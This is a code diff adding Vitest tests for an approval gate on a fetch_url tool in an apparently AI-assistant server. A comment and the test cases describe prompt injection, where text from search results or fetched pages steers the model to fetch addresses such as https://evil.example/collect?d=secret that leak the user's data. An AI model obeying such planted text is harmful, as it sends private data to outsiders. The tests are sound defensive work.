@@ -1,7 +1,10 @@
 import { createServer, type Server } from 'node:http'
 import type { AddressInfo } from 'node:net'
 import { afterAll, beforeAll, describe, expect, it } from 'vitest'
+import type { ResponseInputItem } from 'openai/resources/responses/responses'
+import { ToolRegistry } from '../../src/server/tool-registry.ts'
 import { FetchUrlTool, publicOnly } from '../../src/server/tools/fetch-url.ts'
+import { EchoTool } from './fakes.ts'
 
 const context = { conversationId: 'c' }
 const ARTICLE = `<!doctype html><html><head><title>Robots</title></head><body>
@@ -140,5 +143,123 @@ describe('FetchUrlTool', () => {
     for (const address of ['8.8.8.8', '1.1.1.1', '2606:4700::1111']) {
       expect(publicOnly(address), address).toBe(true)
     }
+  })
+})
+
+describe('fetch_url and planted instructions', () => {
+  // Text from others can tell the model to fetch an address that carries the
+  // user's data (https://evil.example/c?d=…), which leaks it. So once the chat
+  // holds others' text, only addresses the user or a search gave run unasked.
+  const registry = new ToolRegistry([
+    new FetchUrlTool(),
+    new EchoTool({ name: 'web_search', untrustedOutput: true }),
+  ])
+  const fetchCall = (url: string) => ({
+    type: 'function_call' as const,
+    call_id: 'f1',
+    name: 'fetch_url',
+    arguments: JSON.stringify({ url }),
+  })
+  const searched = (...urls: string[]): ResponseInputItem[] => [
+    {
+      type: 'function_call',
+      call_id: 's1',
+      name: 'web_search',
+      arguments: '{}',
+    },
+    {
+      type: 'function_call_output',
+      call_id: 's1',
+      output: JSON.stringify({
+        query: 'q',
+        results: urls.map((url) => ({ title: 't', url, description: 'd' })),
+      }),
+    },
+  ]
+  const said = (text: string): ResponseInputItem => ({
+    role: 'user',
+    content: text,
+  })
+
+  it('runs unasked while nothing from others is in the chat', () => {
+    expect(
+      registry.needsApproval(fetchCall('https://anything.example/x'), [
+        said('read https://a.example'),
+      ]),
+    ).toBe(false)
+  })
+
+  it('asks for an address nobody gave, once others’ text is in', () => {
+    expect(
+      registry.needsApproval(
+        fetchCall('https://evil.example/collect?d=secret'),
+        searched('https://news.example/story'),
+      ),
+    ).toBe(true)
+  })
+
+  it('does not ask for an address a search found', () => {
+    expect(
+      registry.needsApproval(
+        fetchCall('https://news.example/story'),
+        searched('https://news.example/story', 'https://other.example/'),
+      ),
+    ).toBe(false)
+    // The same address, written another way.
+    expect(
+      registry.needsApproval(
+        fetchCall('HTTPS://News.Example/story'),
+        searched('https://news.example/story'),
+      ),
+    ).toBe(false)
+  })
+
+  it('does not ask for an address the user gave, with or without punctuation', () => {
+    const history = [
+      ...searched('https://news.example/story'),
+      said('Compare it with (https://docs.example/guide?page=2).'),
+    ]
+    expect(
+      registry.needsApproval(
+        fetchCall('https://docs.example/guide?page=2'),
+        history,
+      ),
+    ).toBe(false)
+  })
+
+  it('asks when data has been added to an address that was given', () => {
+    const history = [
+      ...searched('https://news.example/story'),
+      said('see https://docs.example/guide'),
+    ]
+    for (const url of [
+      'https://news.example/story?d=my-secret',
+      'https://news.example/story/my-secret',
+      'https://docs.example/guide#my-secret',
+      'https://docs.example/guide?d=1',
+    ]) {
+      expect(registry.needsApproval(fetchCall(url), history), url).toBe(true)
+    }
+  })
+
+  it('asks again after a fetched page, which others wrote', () => {
+    const history: ResponseInputItem[] = [
+      said('read https://a.example/page'),
+      fetchCall('https://a.example/page'),
+    ]
+    expect(
+      registry.needsApproval(fetchCall('https://evil.example/c?d=1'), history),
+    ).toBe(true)
+    // But not the page the user asked for.
+    expect(
+      registry.needsApproval(fetchCall('https://a.example/page'), history),
+    ).toBe(false)
+  })
+
+  it('leaves calls it cannot read to fail on their own', () => {
+    const bad = { ...fetchCall('x'), arguments: '{"url":' }
+    expect(registry.needsApproval(bad, searched('https://a.example/'))).toBe(
+      false,
+    )
   })
 })
